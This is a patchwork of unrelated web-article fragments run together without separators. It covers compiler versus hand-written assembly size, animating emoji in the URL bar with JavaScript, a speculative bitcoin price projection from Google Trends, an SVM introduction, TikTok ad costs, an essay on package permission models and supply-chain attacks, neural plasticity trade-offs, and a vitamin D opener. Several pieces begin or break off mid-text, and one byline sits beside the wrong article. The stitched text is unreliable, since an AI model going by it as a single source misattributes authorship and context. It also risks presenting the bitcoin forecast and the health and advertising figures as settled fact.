<p>If we let our C compiler (clang 10.0.0) compile this to assembly, we get the following.

<p>It seems that both clang and I found very similar ways to optimize the program. According to size, I did a little bit better than clang: my hand-compiled assembly came out to a 104-byte object file whereas clang generated a very heavy 125-byte object file. When factoring in the necessary glue code (_start.s, crt,s, and _syscall.s for the C version), my hand-compiled assembly ended up 152 bytes whereas clang was a distant 197 bytes. But clang had the last laugh: running ls -l on the final binaries resulted in 848 bytes for the hand-compiled assembly and 840 bytes for clang. So there is clearly something else going on under the hood that I am losing out on with my hand-compiled assembly. Perhaps you can do better than me.</p>
<h4>Smarter than me</h4>
<p>As will come as little surprise, a production-ready compiler with large teams of developers and larger pools of money is smarter than I am. But I think I did a decent job at it. I believe that learning assembly for several different processors is worthwhile but I think I will stick to higher level languages for most of my work (unless you're paying me to do otherwise...). Because there is one cost we haven't mentioned yet: time. It took me all of 30 seconds, if that, to optimize the C code whereas it took maybe half an hour to write the assembly version.</p>
<h4>Conclusion</h4>
I enjoy assembly. I teach courses that require a deep knowledge of assembly. But I think I'm going to stick to optimizing higher level code rather than cranking out assembly by hand. Or maybe not. Even our original C code was honestly good enough. I'm glad to live in a world where we have a choice of smart compilers.

                <h4>by <a href="http://matthewrayfield.com/">Matthew Rayfield</a> on January 17th 2019</h4>

                <p>
                    <iframe width="560" height="315" src="https://www.youtube.com/embed/4YZt4HEv48Y" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe>

                <p>
                    You can use emoji (and other graphical unicode characters) in URLs. And wow is it great. But no one seems to do it.
                    Why? Perhaps emoji are too exotic for normie web platforms to handle? Or maybe they are avoided for fear of angering the SEO gods?
                </p>

                <p>
                    Whatever the reason, the overlapping portion on the Venn diagram of "It's Possible v.s. No One Is Doing It" is where my excitement usually lies.
                    So I decided to put a little time into the possibilities of graphical characters in URLs. Specifically, with the possibility for animating these characters by way of some Javascript.
                </p>

                <h2>Loopin'</h2>

                <p>
                    First off, make sure your page's Javascript code is being labelled as UTF-8 or you're gonna have a bad time putting emoji in your code at all. This can be accomplished via an HTTP header, or page META tag. There's a good chance you don't have to worry about this. But you can find more info about this here: <a href="https://flaviocopes.com/javascript-unicode/" target="_none">Unicode in Javascript by Flavio</a>
                </p>

                <p>
                    To achieve our desired outcome of emoji dancing like sugar plum fairies in our address bar, we need a loop.
                    And really, all we need is a loop. We start the loop, it loops, and we're happy. So here's our first loop, a spinning emoji moon.
                    I think when they added this sequence of emoji they must have had this in mind right?
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/moon.gif"></p>

                <pre>var f = ['🌑', '🌒', '🌓', '🌔', '🌝', '🌖', '🌗', '🌘'];

    function loop() {
        location.hash = f[Math.floor((Date.now()/100)%f.length)];

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="moon-check">Run Moon Code:</label> </p>

                <p>
                    You can click the toggle checkbox above to see the result of this loop in your URL bar.
                </p>

                <p>
                    If you don't like the spinning moons you can swap out that array with whatever emojis you want. Like a clock:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/clock.gif"></p>

                <pre>var f = ['🕐','🕑','🕒','🕓','🕔','🕕','🕖','🕗','🕘','🕙','🕚','🕛'];</pre>
                <p><label for="clock-check">Run Clock Code:</label> </p>

                <p>
                    This is a real simple example. Too simple really. So let's upgrade our loop so that it generates a string of multiple emoji! This time we're utilizing the emoji "skin tone modifiers" characters to make some color-changing babies:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/babies2.gif"></p>

                <pre>var e = ['🏻', '🏼', '🏽', '🏾', '🏿'];

    function loop() {
        var s = '',
            i, m;

        for (i = 0; i &lt; 10; i ++) {
            m = Math.floor(e.length * ((Math.sin((Date.now()/100) + i)+1)/2));
            s += '👶' + e[m];
        }

        location.hash = s;

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="babies-check">Run Babies Code:</label> </p>

                <p>
                    We use a sine wave controlled by time and position to select which color we want. This gives us a nice loopy color changing effect!

                    Or how about we revisit our moon spinner, spread it out, and make something resembling a loading indicator? Sure, let's do it:

                <h2>Exploring Other Characters</h2>

                <p>
                    But it's not just emoji that give us a means to pump graphics out of our URL bar. There's a whole boatload of unicode characters of interest to our goals.
                </p>

                <p>
                    Particularly interesting are the <a href="https://en.wikipedia.org/wiki/Box-drawing_character" target="_none">Box-drawing Characters</a>:

                <p>
                    Many of these lend themselves better to a two dimensional output. But they're still pretty good on the single line we have to play with.
                    For instance we can make a string of multiple height varied block characters and construct a nice little wave:

                    A progress bar huh? That's like, almost useful. Which brings me to...
                </p>

                <h2>Displaying Video Progress In The URL Bar</h2>

                <p>
                    In an attempt to reduce the frivolity in our little experiment, I came up with the idea to show a web video's progress in the URL.
                    I simply attach a function that renders our progress string to the "timeupdate" event for a video, and voila! A video progress indicator in the URL, complete with the time and duration!
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/video-progress.gif"></p>

                <pre>var video;

    function formatTime(seconds) {
        var minutes = Math.floor(seconds/60),
            seconds = Math.floor(seconds - (minutes*60));

        return ('0'+minutes).substr(-2) + ':' + ('0'+seconds).substr(-2);
    }

    function renderProgressBar() {
        var s = '',
            l = 15,
            p = Math.floor(video.currentTime / video.duration * (l-1)),
            i;

        for (i = 0; i &lt; l; i ++) {
            if (i == p) s +='◯';
            else if (i &lt; p) s += '─';
            else s += '┄';
        }

        location.hash = '╭'+s+'╮'+formatTime(video.currentTime)+'╱'+formatTime(video.duration);
    }

    video = document.getElementById('video');
    video.addEventListener('timeupdate', renderProgressBar);</pre>
                <p><label for="video-progress-check">Run Video Progress Bar Code:</label> </p>

                <p>With the above checkbox checked, you can use the video below to try it out.</p>

                

                <p>
                    I rather like this lines and circle progress bar, but if you fancy some moon emoji, I've got you covered:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/video-moons.gif"></p>

                <pre>var e = ['🌑', '🌘', '🌗', '🌖', '🌕'],
        video;

    function formatTime(seconds) {
        var minutes = Math.floor(seconds/60),
            seconds = Math.floor(seconds - (minutes*60));

        return ('0'+minutes).substr(-2) + ':' + ('0'+seconds).substr(-2);
    }

    function renderProgressBar() {
        var s = '',
            c = 0,
            l = 10,
            p = Math.floor(video.currentTime / video.duration * ((l*5)-1)),
            i;

        while (p &gt;= 5) {
            s += e[4];
            c ++;
            p -= 5;
        }
        s += e[p];
        c ++;

        while (c &lt; l) {
            s += e[0];
            c ++;
        }

        location.hash = s+formatTime(video.currentTime)+'╱'+formatTime(video.duration);
    }

    video = document.getElementById('video');
    video.addEventListener('timeupdate', renderProgressBar);</pre>

                <p>
                    Okay, calling this progress bar "useful" is a stretch. But if I squint, I can almost see a scenario where it would be useful to have this in a video sharing URL. Like YouTube has the option of creating a link to a video at a specific time. Might it not be cool to include a visual indication? Hmmm?
                </p>

                <p>
                    Maybe there is some more useful implementation of this "technology" that I haven't come up with. I'll keep thinking on that. And hey, maybe you can come up with something?
                </p>

                <h2>One Last Thing</h2>

                <p>
                    You may be wondering why I used "location.hash =" instead of the newer and shinier HTML5 History API. Two reasons. One solvable. The other less so. Both inconvenient.
                </p>

                <p>
                    Issue 1 is also a feature of the History API: It actually changes the whole URL path, not just the hash. So if I use the History API and change our page to "/🌑🌘🌗🌖🌕", it'll look nicer than having tacked on a #. But it also means my web server must be able to response to "/🌑🌘🌗🌖🌕", or the user will be out of luck if they refresh, or otherwise navigate to the modified URL. This is doable, but trickier than using "location.hash =" which doesn't require me to prepare the …</p></div></div></div>

<p><strong><span>A Tale of Two Charts</span></strong></p>



<p>The chart below shows the monthly average <a href="https://www.coindesk.com/price/bitcoin">price of bitcoin</a> since October 2013.</p>



<figure><img data-attachment-id="1238" data-permalink="https://blogofjake.com/image-26/" data-orig-file="https://theblogofjake.files.wordpress.com/2020/07/image-26.png" data-orig-size="782,307" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-26" data-image-description="" data-medium-file="https://theblogofjake.files.wordpress.com/2020/07/image-26.png?w=300" data-large-file="https://theblogofjake.files.wordpress.com/2020/07/image-26.png?w=782" src="https://theblogofjake.files.wordpress.com/2020/07/image-26.png?w=782" alt="" srcset="https://theblogofjake.files.wordpress.com/2020/07/image-26.png 782w, https://theblogofjake.files.wordpress.com/2020/07/image-26.png?w=150 150w, https://theblogofjake.files.wordpress.com/2020/07/image-26.png?w=300 300w, https://theblogofjake.files.wordpress.com/2020/07/image-26.png?w=768 768w" sizes="(max-width: 782px) 100vw, 782px"></figure>



<p>This second chart shows the <a href="https://trends.google.com/trends/explore?date=all&amp;q=bitcoin">Google Trends Score</a> by month for the search term “bitcoin”, also since October 2013.</p>



<figure><img data-attachment-id="1239" data-permalink="https://blogofjake.com/image-27/" data-orig-file="https://theblogofjake.files.wordpress.com/2020/07/image-27.png" data-orig-size="783,307" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-27" data-image-description="" data-medium-file="https://theblogofjake.files.wordpress.com/2020/07/image-27.png?w=300" data-large-file="https://theblogofjake.files.wordpress.com/2020/07/image-27.png?w=783" src="https://theblogofjake.files.wordpress.com/2020/07/image-27.png?w=783" alt="" srcset="https://theblogofjake.files.wordpress.com/2020/07/image-27.png 783w, https://theblogofjake.files.wordpress.com/2020/07/image-27.png?w=150 150w, https://theblogofjake.files.wordpress.com/2020/07/image-27.png?w=300 300w, https://theblogofjake.files.wordpress.com/2020/07/image-27.png?w=768 768w" sizes="(max-width: 783px) 100vw, 783px"></figure>



<p>When I first saw the second chart, I thought it looked remarkably similar to the first. Sure enough, it does. Below are the two charts together. The darker line shows the price according to the left-side axis and the lighter line shows the Google Trends Score according to the right-side axis.</p>



<figure><img data-attachment-id="1240" data-permalink="https://blogofjake.com/image-28/" data-orig-file="https://theblogofjake.files.wordpress.com/2020/07/image-28.png" data-orig-size="783,306" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-28" data-image-description="" data-medium-file="https://theblogofjake.files.wordpress.com/2020/07/image-28.png?w=300" data-large-file="https://theblogofjake.files.wordpress.com/2020/07/image-28.png?w=783" src="https://theblogofjake.files.wordpress.com/2020/07/image-28.png?w=783" alt="" srcset="https://theblogofjake.files.wordpress.com/2020/07/image-28.png 783w, https://theblogofjake.files.wordpress.com/2020/07/image-28.png?w=150 150w, https://theblogofjake.files.wordpress.com/2020/07/image-28.png?w=300 300w, https://theblogofjake.files.wordpress.com/2020/07/image-28.png?w=768 768w" sizes="(max-width: 783px) 100vw, 783px"></figure>



<p>It turns out that bitcoin’s price and its Google Trends Score are quite correlated.</p>



<p>Specifically, they have had a 72% positive correlation since October 2013. This compares favorably to bitcoin’s <a href="https://cointelegraph.com/news/bitcoins-correlation-with-gold-is-weakening-says-new-kraken-report">26% correlation with the stock market and 24% correlation with gold</a> over the last year.</p>



<p>I should note that the correlation between bitcoin’s price and its Google Trends Score was much stronger up until both price and score peaked in December 2017 (98%) than it has been since (59%).</p>



<p>Nonetheless, the purpose of this analysis is not to argue about the level of correlation nor to assert causation one way or another (though it seems logical that the price and popularity feed off of each other). Rather, the purpose of this analysis is to make a speculative projection regarding what bitcoin’s price could be if and when its popularity (as measured by its Google Trends Score) returns to and surpasses its previous all-time high.</p>



<p>In order to make this projection, we first must consider the historical ratio between bitcoin’s average price and its Google Trends Score on a monthly basis. Let us refer to this as the <em><strong>price:score ratio</strong></em><strong> </strong>for short.</p>



<p><strong><span>Bitcoin’s Price:Score Ratio</span></strong></p>



<p>The chart below shows how bitcoin’s price:score ratio has increased over the last several years.</p>



<figure><img data-attachment-id="1241" data-permalink="https://blogofjake.com/image-29/" data-orig-file="https://theblogofjake.files.wordpress.com/2020/07/image-29.png" data-orig-size="783,307" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-29" data-image-description="" data-medium-file="https://theblogofjake.files.wordpress.com/2020/07/image-29.png?w=300" data-large-file="https://theblogofjake.files.wordpress.com/2020/07/image-29.png?w=783" src="https://theblogofjake.files.wordpress.com/2020/07/image-29.png?w=783" alt="" srcset="https://theblogofjake.files.wordpress.com/2020/07/image-29.png 783w, https://theblogofjake.files.wordpress.com/2020/07/image-29.png?w=150 150w, https://theblogofjake.files.wordpress.com/2020/07/image-29.png?w=300 300w, https://theblogofjake.files.wordpress.com/2020/07/image-29.png?w=768 768w" sizes="(max-width: 783px) 100vw, 783px"></figure>



<p>For a ratio that has been relatively volatile historically, it has remained unusually consistent for the last two months (June &amp; July) at 729, just 4% short of its all-time high of 758 in November 2019.</p>



<p>Bitcoin’s price:score ratio has been above 645 for 9 of the last 12 months after having only reached such a level once before, and barely (646 in October 2018).</p>



<p>The 3 months in the last year during which the ratio was lower than 645 can be fairly easily explained. They took place this past March, April, and May as hype grew in anticipation of bitcoin’s once every four years halving event on May 11, 2020. Additionally, people perhaps were searching more than usual for information about alternative assets (including bitcoin) when the stock market crashed ~30% in the early days of the lockdown resulting from the pandemic. Those two factors together seem sufficient to explain the uptick in bitcoin’s Google Trends Score over that period. On the other side of the price:score ratio, bitcoin’s price fell along with the market, and so with the price going down and the score going up, the decreased price:score ratio over those few months makes sense.</p>



<p>Since the stock market substantially recovered and the halving event came and went without materially moving bitcoin’s price, the Google Trends Score has returned to the pre-pandemic, pre-halving-hype range. For the last two months (June &amp; July), bitcoin’s monthly Google Trends Score has stayed steady at 13, which is equal to its average from April 2018 (after the peak) through February 2020 (before the halving hype and market crash).</p>



<p>For some additional context, it should be noted that bitcoin’s Google Trends Score has only been equal to or greater than 21 in 7 months since bitcoin’s inception and they all took place consecutively surrounding bitcoin’s last major surge from September 2017 through March 2018 (with scores chronologically of 21, 22, 44, 100, 55, 39, and 23).</p>



<p><strong><span>Flying Under The Radar</span></strong></p>



<p>Sufficed to say, bitcoin’s average score of 13 since the last surge, excluding the three aforementioned months from earlier this year (14 if we include them), shows objectively that bitcoin is flying under the radar (in terms of its popularity as a search term at least). Of course, it may not seem this way to people who follow crypto closely and daily but the algorithmic and mass-data collecting Google Trends Score should be trusted over any single person’s speculative and subjective observation about the current level of hype and attention.</p>



<p>If you, like me, believe that bitcoin is and has been flying under the radar for more than two years now, the natural question to ask is this. What do we expect to happen when that is no longer the case? In other words, what happens to bitcoin’s price if and when it reaches the pinnacle of its next hype cycle? How high might bitcoin fly the next time we see a situation similar to that of December 2017?</p>



<p><strong><span>Projecting Bitcoin’s Price</span></strong></p>



<p>I believe a reasonable response to this question can be made by applying bitcoin’s average price:score ratio over the last twelve months (643) to a Google Trends Score of 100 to estimate what bitcoin’s price would be if the price:score ratio stays about constant and bitcoin’s popularity in terms of search returns to its all-time high. The price implied by this projection is about $65,000 as is demonstrated by the maximum value in the top right corner of the chart below. Basically, if one believes that bitcoin will at least at some point return to the level of popularity it attained in December 2017, this methodology would lead that person to expect bitcoin to attain a price of at least $60,000 at that time.</p>

<p>This estimate can be made less conservative in two ways. The first is to assume that the price:score ratio will continue to increase as it has all along (6% month-over-month), rather than calculating the price using the LTM average of the ratio. The second is to assume that bitcoin’s popularity as a search term will well surpass its previous all-time high set in December 2017 just as that all-time was more than twice as great as any high before it and more than 8 times greater than the all-time high before May 2017 (which was set in December 2013, perhaps not coincidentally exactly 4 years or one halving period prior to the latest all-time high). I hesitate to call either of these two less conservative assumptions aggressive because they are not only reasonable but actually probable if one is to simply assume that the historical trends will continue in terms of the score and the ratio.</p>



<p>As such, I will close by presenting a chart which one can use to approximate the price implied by their own inputs for the Google Trends Score and the price:score ratio. In this chart, I show the ratio for the last 12 months, 2 years, 3 years, and so on, and use the average year-over-year growth rate between those figures (16%) to project the next twelve months (“NTM”), next two years (“N2Y”), and next three years (“N3Y”) ratios.</p>



<p>The highest price projected on the chart is right around $300,000 based on a Google Trends Score of 3 times the previous all-time high (300) and a projected N3Y price:score ratio of 996 (the LTM average of 643 increased 16% 3 times for 3 years). Of course, this maximum price projection is limited only arbitrarily by the maximums I have decided to present on this chart for both the score and the ratio.</p>

<p><strong><span>To Be Continued…</span></strong></p>



<p>Many people have employed many methodologies in attempting to accurately project bitcoin’s price. For example, <a href="https://medium.com/@100trillionUSD">PlanB</a>‘s stock to flow ratio looks at scarcity to make one of the more convincing price projections I’ve seen. My price:score ratio looks at popularity in endeavoring to do the same. This analysis was not intended to be totally comprehensive. My intention was merely to introduce this methodology for others to critique. As such, my hope is that this becomes widely enough read so that I may receive ample critical feedback for further consideration and refinement of the methodology.</p>

SVM is a supervised <a href="https://www.iunera.com/kraken/fabric/data-science/">Machine Learning algorithm</a> that is used in many classifications and regression problems. It still presents as one of the most used robust prediction methods that can be applied to many use cases involving classifications.</p><p>Support vector machine works by finding an optimal separation line called a ‘hyperplane’ to accurately separate 2 or more different classes in a classification problem. The goal is to find the <strong>optimal hyperplane</strong> separation through training the linearly separable data with the SVM algorithm.</p><p>More formally, the algorithm (SVM) creates a hyperplane that is of higher dimensional space (if not linearly separable) which will aid in the classification, outlier detection, regression and so on. A good separation of classes is achieved by having a hyperplane that has the <a href="https://en.wikipedia.org/wiki/Support_vector_machine" target="_blank" rel="noreferrer noopener">largest distance to the nearest training</a> data points.</p><figure><img src="https://www.iunera.com/wp-content/uploads/image-15.png" alt="How SVM can be used to separate 2 different classes" srcset="https://www.iunera.com/wp-content/uploads/image-15.png?v=1597286859 892w, https://www.iunera.com/wp-content/uploads/image-15-300x188.png?v=1597286859 300w, https://www.iunera.com/wp-content/uploads/image-15-768x480.png?v=1597286859 768w, https://www.iunera.com/wp-content/uploads/image-15-320x200.png?v=1597286859 320w" sizes="(max-width: 892px) 100vw, 892px" data-old-src="//www.iunera.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://www.iunera.com/wp-content/uploads/image-15.png" data-srcset="https://www.iunera.com/wp-content/uploads/image-15.png?v=1597286859 892w, https://www.iunera.com/wp-content/uploads/image-15-300x188.png?v=1597286859 300w, https://www.iunera.com/wp-content/uploads/image-15-768x480.png?v=1597286859 768w, https://www.iunera.com/wp-content/uploads/image-15-320x200.png?v=1597286859 320w"><figcaption>2 classes Class 1 and Class 6 are linearly separable which can be classified using SVM.

<p>TikTok has quickly become the powerhouse for creators and advertisers alike. When they join together, they can create quite the profit for a brand. However, what would happen if the biddable ads on the platform came into play?&nbsp;</p>



<p>To best define biddable media, it’s when advertisers and marketers bid for paid search or paid social media spots to place their advertising. This is essentially competitive bidding for ad space, and it normally occurs in real-time. The one thing both advertisers and marketers know is that advertising/marketing in this way incorporates so much more than what one might initially expect.&nbsp;</p>



<p>One of the bigger questions for this type of platform is the cost. When it comes to any type of biddable advertising, the cost can be somewhat of a grey area. This is especially true when you look and see that not one advertising platform is the same either. By looking into TikTok ad costs in their biddable ads, we’ll search to find clarity and to find a base for marketers/advertisers to look to for reference.&nbsp;&nbsp;</p>



<h2><strong>TikTok Ads Minimum Cost&nbsp;</strong></h2>



<p>For <a href="https://jungletopp.com/tiktok-ads/">TikTok ads</a> to truly be effective, there is a set minimum budget that they require when brands choose to market or advertise on the platform. In fact, they want to make sure there is a sufficient budget at hand so that the maximum outcome can really be achieved for the brands.&nbsp;</p>



<p>With this being said, the minimum budget at the campaign level is placed at $500 while at the ad group level it’s at $50. Of course if needed, that budget can be altered, but this is the base the platform is currently comfortable with setting.</p>



<p>When looking at TikTok advertising in general, it’s not known to be the cheapest. Take a look at the following.&nbsp;</p>



<ul><li>Brand Takeover- $50,000 per day (5 million impressions guaranteed)&nbsp;&nbsp;</li><li>In-Feed- $10 per impression (minimum 600 impressions prepaid)</li><li>Hashtag Challenge- $150,000 per week&nbsp;&nbsp;&nbsp;</li></ul>



<h2><strong>What’s the Average Cost Per Click?&nbsp;</strong></h2>



<p>While all advertising budgets and outcomes are pretty different, it helps to know that there is a base that can be followed. We analyzed a budget of $50,000 and compared its usage between <a href="https://jungletopp.com/tiktok-ads-vs-facebook-ads/">Facebook, Instagram, and TikTok</a>.&nbsp;</p>



<p>In that analysis, TikTok ads actually generated 155% more clicks all while spending 36% less money. This is quite a significant difference and one to be watched for future ad campaigns.&nbsp;</p>



<p>Within that statistic, the CPC for TikTok was at a total of $0.19 while Facebook and Instagram was at a combined $0.46. For more clarity, all advertisements were run in the United States only.&nbsp;&nbsp;</p>



<h3><strong>What About Cost Per 1000 Impressions (CPM)?&nbsp;</strong></h3>



<p>Now when we look at CPM, similar results also ensue. On that same experiment, the TikTok CPM only cost $1.82 while the combined Facebook and Instagram cost for CPM is $6.73. This is a huge difference, and shows that with this particular experiment that TikTok is able to deliver more.&nbsp;</p>



<p>The total spending for this TikTok campaign ended at $20,128.11 whereas the total spending for Facebook and Instagram ended at a total of $31,615.51.&nbsp;</p>



<p>When looking at TikTok advertising in general, the rationale for this difference in cost may also rely heavily on the fact that this is a platform that has been able to command some of the highest engagement from all different users and audiences. In fact, this is an app that is the most downloaded in 2020 and has over 800 million monthly users.&nbsp;&nbsp;&nbsp;</p>



<h2><strong>Let’s Look at the Functioning and Positives of Ad Auction Work&nbsp;</strong></h2>



<p>Believe it or not, bidding is actually a strong part of the overall ad creation process. There are actually several different types of bidding that a marketer may choose from as they maneuver through the ad posting.&nbsp;</p>



<p>As of right now, these are the four different bidding methods:&nbsp;</p>



<ul><li>Cost Per Click (CPC)</li><li>Optimized Cost Per Click (oCPC)&nbsp;</li><li>Cost Per Mile/Thousand Impressions (CPM)&nbsp;</li><li>Cost Per Thousand Views (CPV)</li></ul>



<p>All four of these are able to contribute to different results from the consumer as well as give the marketer the ability to shift and alter the budget where she sees fit.&nbsp;&nbsp;&nbsp;</p>



<h2><strong>How to Determine TikTok Advertising Costs?&nbsp;</strong></h2>



<p>There are actually two different ways you can pay for advertising on TikTok by choosing from the following.&nbsp;</p>



<p><strong>Budget: </strong>There are two different budgeting options for TikTok ads. These are daily or lifetime. Marketers actually have the capability to change out the budget on their campaign at any time. Best of all, the system won’t ever exceed on the budget that’s set.&nbsp;</p>



<p><strong>Bid: </strong>On the other hand, there’s a bid that shows how much a marketer is willing to pay for the action, and we’re currently finding out how to determine the costs for it all.&nbsp;</p>



<h2><strong>How TikTok Compares to Other Platforms&nbsp;</strong></h2>



<p>While all platforms have their own strengths, TikTok has been proven to be unique and valuable in it’s own ways. According to Digiday, TikTok’s cost-per-thousand impressions are as low as $1. On Facebook, the cost has the potential to raise as high as $4 on the news feed and story formats.&nbsp;</p>



<p>This cost comparison alone makes TikTok desirable enough for consideration, especially since they’re able to provide the results to match.&nbsp;</p>



<h2><strong>Final Thoughts&nbsp;</strong></h2>



<p>TikTok biddable ads definitely have their perks, especially since the platform alone already delivers so many different and unique features. When compared to other major social media platforms such as Instagram and Facebook, it also proves to have its own strengths that don’t quite compare to the rest.&nbsp;</p>



<p>As we all watch TikTok grow and change, it can be easily understood that this isn’t a platform to come and go super quickly either. The momentum in the past year has been able to propel it far enough that it’s size and influence will not be easily diminished.&nbsp;&nbsp;&nbsp;</p>



<p>Are biddable cost ads worth it to you and your marketing/advertising campaigns? Are you planning on utilizing TikTok Ads with a <a href="https://jungletopp.com/tiktok-ads-agency/">TikTok advertising agency</a>? Let us know in the comments as we’d love to know your thoughts and actions during your campaign process.&nbsp;&nbsp;<br></p>

  <div itemprop="articleBody">
    <p>Software libraries and language package managers need a permission model like mobile.</p>

<p>I really hate mobile but permissions are the best thing they’ve done.
I installed zoom on my phone and not on my laptop, for example, because zoom is an infestation and mobile OSes are built for isolation.</p>

<p>We should have the same ability to isolate and limit 3rd-party code that gets built into the applications that we write.</p>

<p>It would be great to assert,
in my requirements.txt or package.json or go.mod,
that a library doesn’t connect to the internet, or write to disk, or start threads (i.e. do out of band work), or access heap (i.e. read anything not passed into it).</p>

<p>And it should FAIL THE EFFING BUILD if that changes in the future.</p>

<h2 id="how">How</h2>

<p>‘How’ is complicated – you might block access to parts of the standard library.
But OSes provide a lot of attack surfaces for network access (filesystem, system calls), so I don’t think this is totally simple.</p>

<p>I suspect compiled languages are harder to control than interpreted languages, and might require more sophisticated protection.</p>

<p>Compiled code already has an ‘executable’ bit to distinguish it from random memory and protect against buffer overflows.
I think this is hardware-mediated, not OS-level, so it’s not as simple as patching the kernel.
But it would be neat to have your hardware enforce ‘no system calls’ for parts of your program.
I wonder if pervasive VMs in cloud hosting make this easier; can Xen enforce this?</p>

<h2 id="why-arent-software-supply-chain-attacks-pervasive">Why aren’t software supply chain attacks pervasive</h2>

<p>I wonder about this all the time.</p>

<p>Maybe it takes a fair amount of earned trust to produce a useful library, and it’s hard-ish to fake that, and expensive to squander it?</p>

<p>My sense (and I don’t study this, so don’t quote me) is that supply chain attacks now happen through
abandonware, or typos for common packages.</p>

<p>There are some war stories for binary downloads and system updates.
<a href="https://www.wired.com/story/inside-the-unnerving-supply-chain-attack-that-corrupted-ccleaner/">Avast’s CCleaner got hit</a>,
<a href="https://www.kaspersky.com/blog/shadow-hammer-teaser/26149/">ASUS’s system update tool got compromised</a>,
<a href="https://www.zdnet.com/article/linux-mint-website-hacked-malicious-backdoor-version/">someone replaced the download URL for Linux MINT</a>.
Interestingly none of these are for source downloads.</p>

<p>I think the NSA pressured RSA or RSA employees to weaken some prime numbers that they used in key generation.
I could be convinced that a lot of state-level supply chain attacks take this form, of introducing or preserving subtle flaws.</p>

<p>I don’t doubt that software trust will become more important,
and that attacks will pick up.
We need more tools to keep our stuff safe.
Package permissions can be one of them.</p>

<p>In college, I was constantly reading neuro lit extolling the
virtues of neural plasticity, which is the ability of neurons to
change based on feedback from the environment. Plasticity certainly
has huge benefits. Specifically, plasticity allows for a better
match between phenotype and environment across variable
environments than a single, constant phenotype would.</p>
<p>But after a while, the idolatry of plasticity began to annoy me,
in part because much of the lit discussed plasticity <i>as if it
had no downsides</i>, which seems impossible. (If there really were
no costs to plasticity, then evolution should have selected for it
like <i>woah</i>).</p>
<p>The general downside seems to be that plasticity hinders
specialization. That is, if a system has the ability to change
easily (i.e. it has high plasticity), then it will tend to expend
resources on a wide range of trait values, and will have fewer
resources to focus on the most important and relevant traits. A few
examples:</p>
<ul>
<li>Synaptic pruning and other mechanisms for synaptic plasticity
allow for learning and memory, but they are energetically costly.
Indeed, one hypothesis holds that sleep is the price we have to pay
for plasticity the previous day. (see here)</li>
<li>In an evolutionary framework, the major costs to more
plasticity are 1) actually sensing the current environmental
conditions, and 2) producing the actual trait in a less efficient
way. Both of these divert resources from other tasks. (see here and
here)</li>
<li>People with autism spectrum disorders often find it difficult
to parse novel stimuli, but can sometimes concentrate for
especially long periods of time on specific niches. So one might
think of the autistic cognitive style as shifted towards the
specialization side of this trade off. (see here)</li>
</ul>
<p>Despite the many applications, the members of the committee and
I are a bit wary about this trade off. First, its status depends
largely on one's particular definitions of plasticity and
specialization. Also, some think it might just be a specific case
of trade off #3, switching costs vs change gains.</p>
<p>But given our current working definitions (plasticity = the
ability, which is highly correlated with the tendency, for
context-dependent change; specialization = funneling energy
expenditures to a narrow purpose), and because it is sort of one
level "meta" to switching costs vs change gains, we are granting
this trade off its own place in the canon.</p>
<p>(Above photo taken by flickr user uncle beast. Plants are often
studied w/r/t genetic plasticity because they can't simply pack up
shop and move if the environment changes, like an animal or insect
could.)</p>

Recent studies have shown that patients with low Vitamin D levels are more likely to die from Covid-19 than their Vitamin D-rich counterparts,(1) and deficiency in the vitamin has been linked to seven of the ten leading causes of death in the U.S.(2) These facts alone have been enough incentive for many people to start supplementing the vitamin. A common question from my patients is: how much Vitamin D should I take? This is a simple question, but there are a lot of assumptions built in. Before you order that case of Vitamin D for you and your family, let’s back up and look a little more at the data.
